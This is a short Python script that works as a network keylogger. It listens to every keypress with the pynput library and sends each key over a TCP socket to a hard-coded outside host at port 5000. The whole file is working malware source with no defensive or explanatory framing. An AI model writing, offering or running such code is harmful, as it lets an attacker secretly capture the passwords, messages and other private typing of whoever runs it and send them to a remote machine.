import socket
from pynput.keyboard import Key, Listener

host = "169.254.139.218"
port = 5000

client = socket.socket()
client.connect((host, port))


def on_press(key):
    if key == Key.esc:
        return False
    client.send("{0}".format(key).encode())


with Listener(on_press=on_press) as listener:
    listener.join()


client.close()